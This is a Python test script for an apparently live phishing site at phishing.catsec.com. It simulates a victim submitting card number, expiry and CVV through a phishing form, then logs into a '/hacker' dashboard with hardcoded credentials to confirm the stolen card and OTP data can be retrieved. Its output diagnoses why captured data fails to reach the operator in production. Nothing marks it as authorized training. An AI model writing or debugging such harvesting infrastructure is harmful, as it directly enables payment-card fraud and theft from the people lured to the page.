#!/usr/bin/env python3
"""
Test script for production deployment at phishing.catsec.com
"""
import requests
from bs4 import BeautifulSoup
import json
import time

BASE_URL = "https://phishing.catsec.com"

def extract_csrf_token(html_content):
    """Extract CSRF token from HTML"""
    soup = BeautifulSoup(html_content, 'html.parser')
    csrf_input = soup.find('input', {'name': 'csrf_token'})
    if csrf_input:
        return csrf_input.get('value')
    return None

def test_victim_submission():
    """Simulate victim submitting card data"""
    print("=" * 70)
    print("PRODUCTION TEST - VICTIM SUBMISSION")
    print("=" * 70)

    # Create a new session (simulates victim browser)
    victim_session = requests.Session()

    # Get the phishing form
    print("\n1. Victim visits phishing page...")
    try:
        response = victim_session.get(f"{BASE_URL}/")
        print(f"   Status: {response.status_code}")
        if response.status_code != 200:
            print(f"   ERROR: Cannot access phishing page")
            return False
    except Exception as e:
        print(f"   ERROR: {e}")
        return False

    # Extract CSRF token
    csrf_token = extract_csrf_token(response.text)
    if not csrf_token:
        print("   ERROR: No CSRF token found")
        return False
    print(f"   CSRF Token: {csrf_token[:30]}...")

    # Submit card data
    print("\n2. Victim submits card data...")
    data = {
        'csrf_token': csrf_token,
        'cardName': 'Production Test',
        'cardNumber': '4580123412341232',
        'expiry': '12/35',
        'cvv': '123'
    }
    try:
        response = victim_session.post(f"{BASE_URL}/submit", data=data)
        print(f"   Status: {response.status_code}")
        success = response.status_code == 200 and 'loading' in response.text.lower()
        print(f"   Response contains 'loading': {success}")
        return success
    except Exception as e:
        print(f"   ERROR: {e}")
        return False

def test_admin_retrieval():
    """Simulate admin checking dashboard from different browser"""
    print("\n" + "=" * 70)
    print("PRODUCTION TEST - ADMIN DASHBOARD (DIFFERENT BROWSER)")
    print("=" * 70)

    # Create a completely separate session (simulates different browser)
    admin_session = requests.Session()

    # Get login page
    print("\n1. Admin visits login page...")
    try:
        response = admin_session.get(f"{BASE_URL}/login")
        print(f"   Status: {response.status_code}")
        if response.status_code != 200:
            print(f"   ERROR: Cannot access login page")
            return False
    except Exception as e:
        print(f"   ERROR: {e}")
        return False

    # Extract CSRF token
    csrf_token = extract_csrf_token(response.text)
    if not csrf_token:
        print("   ERROR: No CSRF token found")
        return False
    print(f"   CSRF Token: {csrf_token[:30]}...")

    # Login with production credentials
    print("\n2. Admin logs in (credentials: cat/meowmeow)...")
    login_data = {
        'csrf_token': csrf_token,
        'username': 'cat',
        'password': 'meowmeow'
    }
    try:
        response = admin_session.post(f"{BASE_URL}/login", data=login_data, allow_redirects=False)
        print(f"   Status: {response.status_code}")

        if response.status_code == 302:
            redirect_url = response.headers.get('Location', '')
            print(f"   Redirect to: {redirect_url}")
            if '/hacker' not in redirect_url:
                print(f"   WARNING: Unexpected redirect location")
        elif response.status_code == 200:
            print(f"   WARNING: No redirect - login may have failed")
            if 'invalid' in response.text.lower():
                print(f"   ERROR: Login failed - invalid credentials or CSRF token")
                return False
        else:
            print(f"   ERROR: Unexpected status code")
            return False
    except Exception as e:
        print(f"   ERROR: {e}")
        return False

    # Get captured data via API
    print("\n3. Admin fetches captured data via API...")
    try:
        response = admin_session.get(f"{BASE_URL}/hacker/data")
        print(f"   Status: {response.status_code}")

        if response.status_code == 200:
            data = response.json()
            print(f"\n   Captured Data:")
            print(f"   - Card data present: {data.get('card') is not None}")
            if data.get('card'):
                print(f"     - Cardholder: {data['card'].get('cardholder_name')}")
                print(f"     - Card #: {data['card'].get('card_number')}")
                print(f"     - Timestamp: {data['card'].get('timestamp')}")
            else:
                print(f"     - NO CARD DATA FOUND!")
            print(f"   - OTP data present: {data.get('otp') is not None}")
            return data.get('card') is not None
        elif response.status_code == 302:
            print(f"   ERROR: Redirected to login - session not authenticated")
            return False
        else:
            print(f"   ERROR: Unexpected response")
            print(f"   Response: {response.text[:200]}")
            return False
    except Exception as e:
        print(f"   ERROR: {e}")
        return False

if __name__ == "__main__":
    print("\n" + "=" * 70)
    print("PRODUCTION DEPLOYMENT TEST - phishing.catsec.com")
    print("=" * 70)
    print("\nThis test simulates the reported issue:")
    print("- Victim uses one browser to submit card data")
    print("- Admin uses DIFFERENT browser to view dashboard")
    print("- Testing if data appears correctly")
    print()

    # Wait a moment to ensure any previous tests have settled
    time.sleep(1)

    # Test 1: Victim submission
    victim_success = test_victim_submission()

    # Wait a moment for data to be processed
    time.sleep(2)

    # Test 2: Admin retrieval (different session)
    admin_success = test_admin_retrieval()

    # Results
    print("\n" + "=" * 70)
    print("TEST RESULTS")
    print("=" * 70)
    print(f"Victim submission: {'✓ SUCCESS' if victim_success else '✗ FAILED'}")
    print(f"Admin data retrieval: {'✓ SUCCESS' if admin_success else '✗ FAILED'}")
    print()

    if victim_success and admin_success:
        print("✓ PASS: Production deployment works correctly!")
        print("  Cross-browser data capture is functioning.")
    elif victim_success and not admin_success:
        print("✗ FAIL: Data was captured but admin cannot retrieve it!")
        print("  This indicates the production issue the user reported.")
        print("\n  Possible causes:")
        print("  - Multiple Gunicorn workers with separate memory spaces")
        print("  - Container restart between victim and admin access")
        print("  - Load balancer routing to different containers")
        print("  - Reverse proxy configuration issue")
    elif not victim_success:
        print("✗ FAIL: Victim submission failed!")
        print("  Check CSRF validation or form processing on production.")

    print("=" * 70)
